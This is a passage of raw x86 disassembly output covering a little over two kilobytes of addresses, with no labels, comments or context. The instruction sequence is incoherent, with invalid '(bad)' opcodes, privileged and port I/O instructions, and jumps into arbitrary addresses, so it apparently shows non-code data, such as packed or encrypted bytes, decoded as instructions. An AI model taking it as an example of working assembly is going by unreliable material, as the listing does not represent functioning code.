  418588:	cmp    DWORD PTR [esi-0x5236f79c],esi
  41858e:	cmp    DWORD PTR [eax+edi*4+0x66feba23],esi
  418595:	push   ss
  418596:	retf   0x11a7
  418599:	shr    DWORD PTR [esi+0x2e],0xee
  41859d:	or     al,0x2d
  41859f:	mov    eax,DWORD PTR [eax+ebp*2]
  4185a2:	ins    BYTE PTR es:[edi],dx
  4185a3:	out    0x7,al
  4185a5:	lods   al,BYTE PTR ds:[esi]
  4185a6:	retf   
  4185a7:	and    eax,0xbdf7c820
  4185ac:	hlt    
  4185ad:	mov    edx,0xd32b9dd6
  4185b2:	aas    
  4185b3:	shr    BYTE PTR [edx-0x4e0ed26c],1
  4185b9:	sub    ebx,esi
  4185bb:	arpl   WORD PTR [edx+0x61933cbf],si
  4185c1:	sbb    eax,0xfd90837
  4185c6:	lock or esi,DWORD PTR [eax-0x52]
  4185ca:	mov    dl,0xbb
  4185cc:	mov    al,0x5f
  4185ce:	outs   dx,DWORD PTR ds:[esi]
  4185cf:	xor    al,BYTE PTR [ebx+0x4318e36]
  4185d5:	ds xor eax,0x9c7fabc2
  4185db:	sub    BYTE PTR cs:[ecx+esi*2-0x2800c919],cl
  4185e3:	jmp    0x418596
  4185e5:	sub    bl,dh
  4185e7:	and    al,0xe1
  4185e9:	dec    ecx
  4185ea:	jnp    0x418590
  4185ec:	add    ch,BYTE PTR [edx]
  4185ee:	(bad)  
  4185ef:	xchg   ecx,eax
  4185f0:	pop    esp
  4185f1:	pop    ds
  4185f2:	adc    esi,DWORD PTR [edi+0x5f]
  4185f5:	push   0x4d5c29fd
  4185fa:	ja     0x41864a
  4185fc:	xchg   esi,eax
  4185fd:	test   eax,0x1e1b75f
  418602:	pop    ebx
  418603:	cmc    
  418604:	xor    al,0x60
  418606:	inc    ebx
  418607:	xchg   ebp,eax
  418608:	xor    cl,BYTE PTR [esi+0x20]
  41860b:	outs   dx,BYTE PTR ds:[esi]
  41860c:	add    al,BYTE PTR [esi-0x7d22b71e]
  418612:	pop    ss
  418613:	dec    edi
  418614:	xlat   BYTE PTR ds:[ebx]
  418615:	int    0xab
  418617:	sbb    bl,dl
  418619:	sub    al,0x24
  41861b:	das    
  41861c:	jp     0x4185cf
  41861e:	jnp    0x4185af
  418620:	not    BYTE PTR [ebp+0x6a0bea4]
  418626:	ret    0xe7e5
  418629:	jno    0x418698
  41862b:	push   esp
  41862c:	lods   al,BYTE PTR ds:[esi]
  41862d:	aam    0xfc
  41862f:	adc    eax,0x2ce07d3e
  418634:	mov    ds:0x256ef188,eax
  418639:	stos   DWORD PTR es:[edi],eax
  41863a:	pop    ebx
  41863b:	stos   DWORD PTR es:[edi],eax
  41863c:	and    dl,BYTE PTR [edi+0x5ef72156]
  418642:	lods   al,BYTE PTR ds:[esi]
  418643:	mov    ebp,0x953185fe
  418648:	pop    es
  418649:	into   
  41864a:	frstor [edi+0x66]
  41864d:	das    
  41864e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41864f:	mov    ecx,0xf00b7d12
  418654:	mov    WORD PTR [ebx-0x5db265b7],ss
  41865a:	call   0x7699c613
  41865f:	bound  edx,QWORD PTR [ebx]
  418661:	cmp    BYTE PTR [esi+eiz*8],ah
  418664:	in     al,dx
  418665:	jns    0x418677
  418667:	int    0xff
  418669:	sub    eax,0xf72bad99
  41866e:	xsave  [edi-0x7dac229c]
  418675:	mov    BYTE PTR [edx],bl
  418677:	mov    DWORD PTR [edx],ebx
  418679:	enter  0xc07,0xa7
  41867d:	xchg   ebx,eax
  41867e:	xor    edx,esp
  418680:	out    dx,al
  418681:	mov    esi,gs
  418683:	mov    ebp,0xf91e2452
  418688:	mov    ah,BYTE PTR [ecx+0x779769e4]
  41868e:	lds    esp,FWORD PTR [esi+0x5f787055]
  418694:	cmp    DWORD PTR [eax-0x3f86db1e],0x64c83239
  41869e:	adc    dl,BYTE PTR [esi]
  4186a0:	ds cdq 
  4186a2:	push   0x5f
  4186a4:	aad    0xae
  4186a6:	xchg   esi,eax
  4186a7:	and    edi,DWORD PTR [edx-0x78c53778]
  4186ad:	jge    0x4186b1
  4186af:	sahf   
  4186b0:	sbb    eax,0xa0797385
  4186b5:	cmp    edx,ecx
  4186b7:	xchg   bh,dh
  4186b9:	sahf   
  4186ba:	fs sar eax,cl
  4186bd:	inc    ebx
  4186be:	xlat   BYTE PTR ds:[ebx]
  4186bf:	mov    cl,BYTE PTR [eax+edi*2+0x1]
  4186c3:	mov    esp,0xcc0df464
  4186c8:	dec    eax
  4186c9:	xor    BYTE PTR [edx-0x44],dh
  4186cc:	cdq    
  4186cd:	in     eax,0x49
  4186cf:	xor    ebx,ebp
  4186d1:	retf   0xcb1b
  4186d4:	lahf   
  4186d5:	pop    ss
  4186d6:	ds cli 
  4186d8:	push   eax
  4186d9:	lock xchg BYTE PTR [edx],dh
  4186dc:	mulps  xmm7,xmm5
  4186df:	xlat   BYTE PTR ds:[ebx]
  4186e0:	mov    dl,BYTE PTR [eax+edx*8-0x3b]
  4186e4:	loopne 0x41875f
  4186e6:	or     DWORD PTR [ebp-0x2a999fc3],0x53
  4186ed:	and    eax,DWORD PTR ds:0x1c613e51
  4186f3:	sub    al,0x21
  4186f5:	and    DWORD PTR [ecx-0x4d97408d],edi
  4186fb:	and    ecx,edi
  4186fd:	dec    eax
  4186fe:	mov    edi,0x74db2196
  418703:	jno    0x4186b8
  418705:	fs jl  0x418703
  418708:	mov    bh,0xf0
  41870a:	iret   
  41870b:	cmp    al,0xc7
  41870d:	mov    esi,0x3500a9a0
  418712:	jmp    0xdec02f60
  418717:	repnz test BYTE PTR [eax],0x88
  41871b:	jb     0x418793
  41871d:	pop    edx
  41871e:	push   0x287892ab
  418723:	mov    cl,0x6d
  418725:	xchg   ebx,eax
  418726:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418727:	imul   eax,DWORD PTR [esi+0x9],0x5478647
  41872e:	cmp    eax,0x5c6f2389
  418733:	push   ds
  418734:	lods   al,BYTE PTR ds:[esi]
  418735:	jmp    0x4186cf
  418737:	sub    ecx,DWORD PTR [eax+0x1b]
  41873a:	sbb    al,0x52
  41873c:	outs   dx,DWORD PTR ds:[esi]
  41873d:	fwait
  41873e:	push   ecx
  41873f:	in     al,0xed
  418741:	shl    DWORD PTR ds:0x734740c9,cl
  418747:	and    DWORD PTR [eax+0x68],ecx
  41874a:	mov    eax,0x5b32a5b5
  41874f:	push   0x31dc487e
  418754:	or     eax,0xc1634a8f
  418759:	xchg   esp,eax
  41875a:	xor    BYTE PTR [ecx+0x73],dh
  41875d:	mov    eax,0xd72a686a
  418762:	sub    eax,0x91d4d17e
  418767:	lea    esi,[ebx+0xec3dbcb]
  41876d:	sbb    ecx,DWORD PTR [esi+ebx*1]
  418770:	call   0xd9a3:0xf6dba9d4
  418777:	jge    0x4187be
  418779:	stc    
  41877a:	gs mov eax,0x911eed55
  418780:	lods   al,BYTE PTR ds:[esi]
  418781:	fst    QWORD PTR [edx+ebp*8+0x772b3e22]
  418788:	retf   0x3a87
  41878b:	repz imul edi,ebp,0xffffffd3
  41878f:	xor    ah,BYTE PTR [eax]
  418791:	ins    BYTE PTR es:[edi],dx
  418792:	fld    TBYTE PTR ds:0xafa52d50
  418798:	jnp    0x418803
  41879a:	lods   eax,DWORD PTR ds:[esi]
  41879b:	mov    bh,BYTE PTR [ebp-0x65]
  41879e:	add    eax,0xfdaee5bd
  4187a3:	push   esp
  4187a4:	mov    ch,0x3e
  4187a6:	adc    BYTE PTR [edx],ah
  4187a8:	dec    sp
  4187aa:	push   esp
  4187ab:	xchg   esi,eax
  4187ac:	push   cs
  4187ad:	inc    ebp
  4187ae:	dec    ebx
  4187af:	inc    esp
  4187b0:	into   
  4187b1:	in     al,dx
  4187b2:	outs   dx,BYTE PTR ds:[esi]
  4187b3:	imul   eax,ecx,0xe8d99070
  4187b9:	mov    esi,0x13be9711
  4187be:	test   al,0x8a
  4187c0:	xchg   ah,ah
  4187c2:	aam    0x62
  4187c4:	loope  0x41877a
  4187c6:	xor    BYTE PTR [eax+0x6b],0xff
  4187ca:	pushf  
  4187cb:	neg    DWORD PTR [eax+0x386ccc64]
  4187d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187d2:	nop
  4187d3:	out    0xfa,al
  4187d5:	cmp    BYTE PTR [edx+0x55],al
  4187d8:	enter  0x7df7,0x56
  4187dc:	lods   eax,DWORD PTR ds:[esi]
  4187dd:	popa   
  4187de:	sub    ebp,DWORD PTR ds:0x10b45dbb
  4187e4:	mov    bl,ah
  4187e6:	dec    ebp
  4187e7:	xchg   ebp,eax
  4187e8:	std    
  4187e9:	adc    edi,DWORD PTR ds:0xac206a3f
  4187ef:	enter  0xad1c,0xa3
  4187f3:	and    ch,BYTE PTR ds:0xb0729fea
  4187f9:	and    al,0x50
  4187fb:	jns    0x4187a0
  4187fd:	cli    
  4187fe:	shl    DWORD PTR [edi+0x7b2a69a3],cl
  418804:	stos   BYTE PTR es:[edi],al
  418805:	repz mov esp,0x21e170b6
  41880b:	inc    esi
  41880c:	cli    
  41880d:	xchg   edx,eax
  41880e:	adc    al,cl
  418810:	das    
  418811:	popa   
  418812:	scas   eax,DWORD PTR es:[edi]
  418813:	sbb    DWORD PTR [edx+0x54],eax
  418816:	int3   
  418817:	inc    edx
  418818:	adc    al,cl
  41881a:	test   eax,0x93c6b3a9
  41881f:	mov    ch,0x33
  418821:	cwde   
  418822:	in     eax,dx
  418823:	dec    ebp
  418824:	pop    DWORD PTR [ecx-0x24397075]
  41882a:	or     bl,BYTE PTR [ecx]
  41882c:	enter  0x9785,0xb1
  418830:	ret    
  418831:	mov    ds:0x9c20ffe,al
  418836:	ss sub ecx,esp
  418839:	movnti DWORD PTR [ecx+0x5ead6f83],ecx
  418840:	aaa    
  418841:	out    0x25,eax
  418843:	scas   eax,DWORD PTR es:[edi]
  418844:	(bad)  
  418846:	mov    eax,0x4e5653eb
  41884b:	rcl    DWORD PTR [esi+edi*4-0x35f7a291],cl
  418852:	or     BYTE PTR [eax-0xf8ee2a6],ah
  418858:	loop   0x418816
  41885a:	and    DWORD PTR ds:0xeb20f48,0x77c17cf1
  418864:	enter  0xb3e,0x4c
  418868:	sub    ch,BYTE PTR [edi+0x17]
  41886b:	outs   dx,BYTE PTR ds:[esi]
  41886c:	and    dl,0x30
  41886f:	shr    DWORD PTR [ebx-0x5ed80267],1
  418875:	fnstsw WORD PTR cs:[ebx+0x20]
  418879:	sti    
  41887a:	mov    BYTE PTR [eax+0x40],bl
  41887d:	in     al,0x6d
  41887f:	dec    eax
  418880:	scas   eax,DWORD PTR es:[edi]
  418881:	sbb    dl,bl
  418883:	retf   0xc4eb
  418886:	gs es cs cwde 
  41888a:	clc    
  41888b:	cmp    al,0xdc
  41888d:	pop    edx
  41888e:	lock std 
  418890:	xor    DWORD PTR [esi-0x20],0xfffffff4
  418894:	and    ebx,DWORD PTR [edi+0x6a]
  418897:	ds xchg esi,eax
  418899:	push   0xffffff80
  41889b:	fdivr  st(2),st
  41889d:	jmp    0x8273fbc9
  4188a2:	sub    al,0xd9
  4188a4:	cmp    dl,bh
  4188a6:	cmp    ah,dl
  4188a8:	pop    ecx
  4188a9:	mov    esp,0xc9475b57
  4188ae:	test   eax,0xd152d0ac
  4188b3:	in     eax,0x5a
  4188b5:	mov    ecx,0xe5407a63
  4188ba:	shr    BYTE PTR [ebp-0x23],1
  4188bd:	xchg   ebp,eax
  4188be:	dec    ebp
  4188bf:	fst    st(3)
  4188c1:	inc    eax
  4188c2:	mov    bh,0x3a
  4188c4:	js     0x418851
  4188c6:	mov    bl,0x15
  4188c8:	fsubr  QWORD PTR [ebx]
  4188ca:	cld    
  4188cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188cc:	(bad)  
  4188cd:	push   eax
  4188ce:	push   ebx
  4188cf:	push   ebx
  4188d0:	je     0x41886d
  4188d2:	jmp    0x4188d0
  4188d4:	jne    0x4188c3
  4188d6:	adc    eax,0xe9d9a5c1
  4188db:	test   DWORD PTR [esp+ecx*4-0x721b3db2],0x84de5ae3
  4188e6:	pusha  
  4188e7:	icebp  
  4188e8:	int    0xbc
  4188ea:	pop    ecx
  4188eb:	aaa    
  4188ec:	lods   al,BYTE PTR ds:[esi]
  4188ed:	out    dx,eax
  4188ee:	rcl    BYTE PTR [edx+edx*4+0x46],0x65
  4188f3:	aad    0x1b
  4188f5:	jecxz  0x4188a3
  4188f7:	jne    0x418959
  4188f9:	cmp    dl,BYTE PTR [edi-0x4f9cc0df]
  4188ff:	cmp    al,0x1
  418901:	ins    DWORD PTR es:[edi],dx
  418902:	pop    ebp
  418903:	retf   
  418904:	pop    esi
  418905:	and    ch,dh
  418907:	adc    bl,bl
  418909:	scas   al,BYTE PTR es:[edi]
  41890a:	jp     0x41896d
  41890c:	and    al,0x9d
  41890e:	hlt    
  41890f:	push   edi
  418910:	dec    esi
  418911:	loop   0x4188b3
  418913:	add    dh,BYTE PTR ds:0x56d125af
  418919:	call   0xeaed719b
  41891e:	mov    esp,0x4093783e
  418923:	(bad)  
  418924:	fsubrp st(7),st
  418926:	out    dx,eax
  418927:	mov    dl,0xc9
  418929:	jmp    0x9095:0x2ad39389
  418930:	dec    edx
  418931:	mov    eax,0xa249965b
  418936:	mov    al,ds:0xeb5924d3
  41893b:	pop    ds
  41893c:	cli    
  41893d:	sbb    al,0xcb
  41893f:	ins    BYTE PTR es:[edi],dx
  418940:	mov    ds,WORD PTR [esp+ebp*2+0x3a]
  418944:	push   esp
  418945:	stos   DWORD PTR es:[edi],eax
  418946:	mov    ecx,0x8cc6c4d9
  41894b:	push   ebp
  41894c:	jb     0x4189b7
  41894e:	dec    ebp
  41894f:	and    BYTE PTR ds:0x8b7771e0,ah
  418955:	test   BYTE PTR [ecx-0x38],0x9d
  418959:	jle    0x418932
  41895b:	mov    fs,WORD PTR [esi*8-0x4a331f6a]
  418962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418963:	ja     0x418991
  418965:	cs ds inc edi
  418968:	or     cl,BYTE PTR [edx]
  41896a:	imul   ebp,DWORD PTR [esi],0xfffffff4
  41896d:	mov    ch,0x28
  41896f:	clc    
  418970:	fpatan 
  418972:	inc    ebp
  418973:	mov    BYTE PTR [edx-0x4d],dl
  418976:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  418978:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418979:	popf   
  41897a:	xlat   BYTE PTR ds:[ebx]
  41897b:	ins    BYTE PTR es:[edi],dx
  41897c:	sub    eax,0x654428ed
  418981:	mov    ds:0x480f8bbb,eax
  418986:	lock and edi,ebp
  418989:	jae    0x41897f
  41898b:	pop    edx
  41898c:	(bad)  
  41898d:	fs jmp 0xf977:0xc091a466
  418995:	call   0xfda153c4
  41899a:	std    
  41899b:	xchg   esi,eax
  41899c:	cdq    
  41899d:	inc    esi
  41899e:	jg     0x41893d
  4189a0:	jl     0x41894b
  4189a2:	outs   dx,DWORD PTR ds:[esi]
  4189a3:	lea    esi,[eax]
  4189a5:	lahf   
  4189a6:	jb     0x4189dc
  4189a8:	cs pop esp
  4189aa:	or     ebp,DWORD PTR [eax+0x5fee9b30]
  4189b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189b1:	jno    0x418a25
  4189b3:	xor    BYTE PTR ds:0xd20646b8,bl
  4189b9:	sahf   
  4189ba:	pop    ebx
  4189bb:	adc    al,0x82
  4189bd:	push   eax
  4189be:	xor    eax,0xed8dc01f
  4189c3:	sub    al,0x83
  4189c5:	popa   
  4189c6:	pop    ebx
  4189c7:	inc    eax
  4189c8:	mov    al,0x3b
  4189ca:	adc    al,0x4b
  4189cc:	into   
  4189cd:	pop    ss
  4189ce:	adc    DWORD PTR [esi+0x6d3a47ab],ecx
  4189d4:	(bad)  
  4189d5:	enter  0x7c60,0xc0
  4189d9:	(bad)  
  4189db:	jne    0x418a5a
  4189dd:	in     al,dx
  4189de:	outs   dx,DWORD PTR ds:[esi]
  4189df:	loop   0x418a2e
  4189e1:	ret    0x29a2
  4189e4:	loop   0x418a0b
  4189e6:	call   0x8cb2e5b9
  4189eb:	les    edx,FWORD PTR [edx]
  4189ed:	popa   
  4189ee:	mov    ds:0x2fcc7e90,al
  4189f3:	test   dl,dh
  4189f5:	enter  0x6821,0x79
  4189f9:	retf   0xe21f
  4189fc:	hlt    
  4189fd:	sub    eax,0x588a393a
  418a02:	xchg   ebp,eax
  418a03:	and    ebp,ebx
  418a05:	test   DWORD PTR [ebx-0x65940434],0x58d9092a
  418a0f:	and    ebx,DWORD PTR [ecx+0x21041f8a]
  418a15:	inc    edi
  418a16:	push   eax
  418a17:	call   0x9e1d:0x851b3d12
  418a1e:	jo     0x4189ff
  418a20:	into   
  418a21:	adc    al,0xd4
  418a23:	inc    edi
  418a24:	dec    esi
  418a25:	add    eax,esi
  418a27:	loope  0x418a27
  418a29:	and    DWORD PTR [ebp-0xa],ebx
  418a2c:	ja     0x418a0e
  418a2e:	sti    
  418a2f:	dec    ecx
  418a30:	or     ah,BYTE PTR [ebx]
  418a32:	les    ecx,FWORD PTR [ecx+0x23c74b0a]
  418a38:	pushf  
  418a39:	retf   0xcfec
  418a3c:	mov    fs,WORD PTR [eax+0x5]
  418a3f:	pop    edi
  418a40:	das    
  418a41:	adc    eax,0x430e67e
  418a46:	sub    al,0x2a
  418a48:	jge    0x418a85
  418a4a:	stos   DWORD PTR es:[edi],eax
  418a4b:	test   BYTE PTR [ecx+0x52],dh
  418a4e:	jbe    0x4189ed
  418a50:	rol    cl,0x79
  418a53:	test   DWORD PTR [edi],0x920805d5
  418a59:	fidivr WORD PTR [ecx+0x1c654bc7]
  418a5f:	mov    dh,0x44
  418a61:	icebp  
  418a62:	clc    
  418a63:	icebp  
  418a64:	adc    DWORD PTR [edi],0x6e
  418a67:	sahf   
  418a68:	xchg   BYTE PTR [esi-0x87dfa83],dh
  418a6e:	pop    ds
  418a6f:	push   0x2b
  418a71:	outs   dx,BYTE PTR ds:[esi]
  418a72:	ret    
  418a73:	out    0xff,eax
  418a75:	mov    bl,0x2c
  418a77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a78:	shl    BYTE PTR [ebx-0x63],0xe6
  418a7c:	xchg   esi,eax
  418a7d:	std    
  418a7e:	add    dl,BYTE PTR [ecx+0x6a]
  418a81:	(bad)  
  418a82:	int    0x32
  418a84:	push   es
  418a85:	sbb    edi,DWORD PTR [ecx-0x25]
  418a88:	pop    ecx
  418a89:	jl     0x418ad4
  418a8b:	lods   al,BYTE PTR ds:[esi]
  418a8c:	jno    0x418abf
  418a8e:	cld    
  418a8f:	adc    eax,0x7ae973e6
  418a94:	ss jno 0x418a1b
  418a97:	mov    eax,tr0
  418a9a:	dec    edi
  418a9b:	jmp    0x30a2:0x672ba841
  418aa2:	mov    ebx,0x6fdb7bec
  418aa7:	push   esp
  418aa8:	mov    ss,WORD PTR [edi+0x6e8f9b3b]
  418aae:	out    0x5c,eax
  418ab0:	xor    al,0x35
  418ab2:	dec    esp
  418ab3:	js     0x418a74
  418ab5:	sub    eax,ebp
  418ab7:	or     ah,dl
  418ab9:	jns    0x418b0f
  418abb:	mov    ebp,edx
  418abd:	cmp    eax,0x96b755b
  418ac2:	fcomp  DWORD PTR [eax+0x4d9a8d4b]
  418ac8:	mov    eax,ds:0x58f7f2f9
  418acd:	int    0xf5
  418acf:	push   esp
  418ad1:	ja     0x418ac9
  418ad3:	les    ebp,FWORD PTR [edx+0x49]
  418ad6:	fisttp DWORD PTR [ecx+0x2c4cde1b]
  418adc:	jnp    0x418ad0
  418ade:	or     dh,bh
  418ae0:	mov    DWORD PTR [ebp+0x11],0x397b99f8
  418ae7:	sbb    eax,0xedec2f9f
  418aec:	mov    bl,0xdc
  418aee:	ins    DWORD PTR es:[edi],dx
  418aef:	repz push 0xffffff98
  418af2:	xchg   ebp,eax
  418af3:	sbb    BYTE PTR [edi+0x5c],al
  418af6:	pop    ds
  418af7:	aam    0x68
  418af9:	scas   eax,DWORD PTR es:[edi]
  418afa:	lea    ebp,[edx-0x7b]
  418afd:	sbb    al,0x81
  418aff:	lahf   
  418b00:	mov    ebx,0xe5bde17e
  418b05:	sbb    DWORD PTR [edi+0x2f],edx
  418b08:	(bad)  
  418b09:	ins    BYTE PTR es:[edi],dx
  418b0a:	aam    0xb6
  418b0c:	cmp    DWORD PTR [ecx-0x29],0x5a
  418b10:	sub    DWORD PTR [eax+eiz*2-0x26],edi
  418b14:	cmp    DWORD PTR [edx-0x34],edx
  418b17:	mov    eax,ds:0x7eefa8fc
  418b1c:	mov    eax,0xc25a8fb9
  418b21:	sbb    eax,DWORD PTR [ecx+ecx*1+0x67fc9f1a]
  418b28:	cs call 0x5ec4cd4f
  418b2e:	inc    esp
  418b2f:	loopne 0x418b45
  418b31:	cmp    edi,DWORD PTR [edi+ebp*4-0x29]
  418b35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b36:	into   
  418b37:	xchg   BYTE PTR [ecx+0x3a],dh
  418b3a:	mov    eax,ds:0xeb0970ec
  418b3f:	(bad)  
  418b40:	aam    0xd9
  418b42:	cs dec ebx
  418b44:	(bad)  
  418b45:	leave  
  418b46:	sub    BYTE PTR [ebx+0xb4d75b7],bl
  418b4c:	jl     0x418b07
  418b4e:	imul   edi,DWORD PTR [ebp+0x6b904476],0x3ffa6c88
  418b58:	shl    DWORD PTR [ebp+0x46f4d5f4],cl
  418b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b5f:	dec    ecx
  418b60:	jb     0x418b42
  418b62:	gs pop ss
  418b64:	(bad)  
  418b65:	sti    
  418b66:	xchg   ebx,eax
  418b67:	outs   dx,DWORD PTR ds:[esi]
  418b68:	stos   BYTE PTR es:[edi],al
  418b69:	test   eax,esi
  418b6b:	stos   BYTE PTR es:[edi],al
  418b6c:	inc    ecx
  418b6d:	nop
  418b6e:	jle    0x418bb7
  418b70:	jmp    0x595c28f6
  418b75:	test   BYTE PTR [edi],0x78
  418b78:	clc    
  418b79:	or     edx,DWORD PTR [esi]
  418b7b:	xchg   edi,eax
  418b7c:	xchg   BYTE PTR [edi],dl
  418b7e:	jne    0x418bf0
  418b80:	in     eax,0xe7
  418b82:	cmp    al,0x3f
  418b84:	mov    ds:0x73215fa8,eax
  418b89:	cwde   
  418b8a:	int    0xe6
  418b8c:	jle    0x418b66
  418b8e:	jbe    0x418bf9
  418b90:	or     BYTE PTR [edx],0xbf
  418b93:	ss push ss
  418b95:	pop    ebp
  418b96:	rcr    DWORD PTR [edi+0x1ada62fa],cl
  418b9c:	add    edi,ebx
  418b9e:	pusha  
  418b9f:	jno    0x418bd3
  418ba1:	push   ebx
  418ba2:	sbb    bl,al
  418ba4:	or     ch,bh
  418ba6:	in     eax,dx
  418ba7:	pop    ds
  418ba8:	fs add ah,0xe3
  418bac:	neg    esp
  418bae:	add    BYTE PTR [esi],cl
  418bb0:	fwait
  418bb1:	xchg   ebx,eax
  418bb2:	cmp    DWORD PTR [ebp*1+0x636eafbf],esp
  418bb9:	mov    ebx,0xca9a8d47
  418bbe:	sbb    edx,eax
  418bc0:	mov    al,ds:0xd786f843
  418bc5:	mov    dl,0x8d
  418bc7:	xlat   BYTE PTR ds:[ebx]
  418bc8:	add    DWORD PTR [ebx+edi*8+0x9],edi
  418bcc:	cld    
  418bcd:	jne    0x418bf5
  418bcf:	cs fs loope 0x418be0
  418bd3:	out    dx,eax
  418bd4:	and    ebx,DWORD PTR [edi+ecx*8-0x1a]
  418bd8:	add    DWORD PTR [ebx+0x1a],eax
  418bdb:	sbb    dl,cl
  418bdd:	push   es
  418bde:	lock xchg edi,eax
  418be0:	and    esp,DWORD PTR [ecx]
  418be2:	pop    es
  418be3:	mov    al,ds:0x706454f5
  418be8:	dec    esp
  418be9:	ds mov ecx,0xc16441f3
  418bef:	int3   
  418bf0:	out    dx,eax
  418bf1:	test   al,0x6f
  418bf3:	and    DWORD PTR [edi-0x14],0xb7345bff
  418bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bfb:	sub    ch,BYTE PTR [ebp+eax*8-0x44563a69]
  418c02:	sbb    al,0x9b
  418c04:	cmp    DWORD PTR [eax],eax
  418c06:	inc    esp
  418c07:	dec    esp
  418c08:	push   ebx
  418c09:	fild   DWORD PTR [ebp+0x7f]
  418c0c:	bnd jb 0x418c27
  418c0f:	jbe    0x418c39
  418c11:	xchg   edi,eax
  418c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c13:	mov    eax,0x48af19d3
  418c18:	pop    ds
  418c19:	ja     0x418c11
  418c1b:	jae    0x418c80
  418c1d:	push   ss
  418c1e:	mov    ecx,DWORD PTR [eax]
  418c20:	jecxz  0x418c76
  418c22:	ja     0x418bf4
  418c24:	cdq    
  418c25:	or     esi,esp
  418c27:	mov    edi,DWORD PTR [ebp+esi*8+0x1e]
  418c2b:	dec    ebx
  418c2c:	push   0xd7ac5e0d
  418c31:	or     bl,ah
  418c33:	retf   
  418c34:	ins    DWORD PTR es:[edi],dx
  418c35:	jl     0x418bd7
  418c37:	aas    
  418c38:	in     al,0x14
  418c3a:	ds lock dec ebp
  418c3d:	repz pop eax
  418c3f:	gs das 
  418c41:	push   ss
  418c42:	xchg   ah,bl
  418c44:	jns    0x418c5d
  418c46:	mov    edx,0x2fb8d073
  418c4b:	and    al,0xb8
  418c4d:	gs ret 
  418c4f:	inc    ebp
  418c50:	mov    bh,0xfc
  418c52:	jle    0x418c7a
  418c54:	out    dx,al
  418c55:	inc    eax
  418c56:	std    
  418c57:	mov    ecx,0x24c59343
  418c5c:	in     eax,0xc0
  418c5e:	mov    esi,0x79d8814
  418c63:	mov    al,ds:0x51cd2bc4
  418c68:	(bad)  [edx-0x2ff645fd]
  418c6e:	sub    DWORD PTR [ebp+edi*4-0x79],ebx
  418c72:	out    0x65,al
  418c74:	sbb    DWORD PTR [edi],ebp
  418c76:	inc    ebx
  418c77:	add    eax,0x57cb4552
  418c7c:	xchg   edi,eax
  418c7d:	pop    ebx
  418c7e:	pop    ecx
  418c7f:	push   es
  418c80:	and    BYTE PTR [edi],ch
  418c82:	in     al,dx
  418c83:	fsubr  QWORD PTR [ecx+0x2b]
  418c86:	dec    ecx
  418c87:	leave  
  418c88:	pop    esi
  418c89:	sbb    al,BYTE PTR [edx-0x3c]
  418c8c:	stos   BYTE PTR es:[edi],al
  418c8d:	dec    eax
  418c8e:	(bad)  
  418c8f:	ja     0x418c8a
  418c91:	sti    
  418c92:	mov    ds:0x2169e760,eax
  418c97:	mov    ebx,0xde690ef3
  418c9c:	sub    al,0xc3
  418c9e:	push   cs
  418c9f:	sar    DWORD PTR [esi],cl
  418ca1:	daa    
  418ca2:	and    bl,BYTE PTR [esi]
  418ca4:	aam    0xee
  418ca6:	bound  esi,QWORD PTR [eax-0x5117c847]
  418cac:	mov    al,ds:0xe3b5c16f
  418cb1:	jns    0x418c7f
  418cb3:	jge    0x418ce2
  418cb5:	jg     0x418ca1
  418cb7:	rcl    esp,cl
  418cb9:	pusha  
  418cba:	cmp    eax,0xe266c150
  418cbf:	stos   DWORD PTR es:[edi],eax
  418cc0:	mov    edi,0xd5133705
  418cc5:	pop    ds
  418cc6:	gs push 0x33
  418cc9:	sbb    edx,DWORD PTR [edx]
  418ccb:	pop    edx
  418ccd:	inc    BYTE PTR [esi+0x5]
  418cd0:	fstp   TBYTE PTR [ebp-0x14]
  418cd3:	pop    edi
  418cd4:	outs   dx,DWORD PTR ds:[esi]
  418cd5:	popa   
  418cd6:	jbe    0x418d18
  418cd8:	clc    
  418cd9:	push   ss
  418cda:	jae    0x418d1f
  418cdc:	fimul  DWORD PTR [ebp+0xed6931d]
  418ce2:	jmp    0x418c68
  418ce4:	test   ecx,ebp
  418ce6:	or     bh,cl
  418ce8:	outs   dx,DWORD PTR ds:[esi]
  418ce9:	jg     0x418cc7
  418ceb:	mov    al,ds:0x174219b2
  418cf0:	lahf   
  418cf1:	lds    eax,FWORD PTR [ebx-0x25]
  418cf4:	stos   BYTE PTR es:[edi],al
  418cf5:	ins    BYTE PTR es:[edi],dx
  418cf6:	fscale 
  418cf8:	sub    dl,BYTE PTR [ebp+0x3d]
  418cfb:	ret    0xbcca
  418cfe:	arpl   WORD PTR [edi+0x37ab2750],di
  418d04:	outs   dx,DWORD PTR ds:[esi]
  418d05:	mov    ds:0xf67eafb6,eax
  418d0a:	loop   0x418cac
  418d0c:	mov    ch,0x5
  418d0e:	xor    al,0x7a
  418d10:	xchg   ebx,eax
  418d11:	adc    ebx,eax
  418d13:	jl     0x418d91
  418d15:	cwde   
  418d16:	sbb    BYTE PTR [esi-0x59101ccc],ah
  418d1c:	aam    0xa8
  418d1e:	sbb    BYTE PTR [ebp+0x13dacf32],bl
  418d24:	xlat   BYTE PTR ds:[ebx]
  418d25:	mov    ch,0x37
  418d27:	test   al,0xb4
  418d29:	dec    edi
  418d2a:	mov    eax,DWORD PTR [esi+0x32]
  418d2d:	sub    dl,al
  418d2f:	ret    
  418d30:	mov    edi,0xc359588e
  418d35:	aad    0x27
  418d37:	not    DWORD PTR [edx-0x3d6ffedb]
  418d3d:	(bad)  
  418d3e:	sahf   
  418d3f:	mov    ebp,0x9585ae57
  418d44:	pop    edi
  418d45:	xchg   edi,eax
  418d46:	add    BYTE PTR [edi-0x539d4969],bh
  418d4c:	stc    
  418d4d:	dec    esi
  418d4e:	clc    
  418d4f:	add    DWORD PTR [eax+0x5d],edx
  418d52:	push   edi
  418d53:	push   0xe24ff456
  418d58:	inc    edx
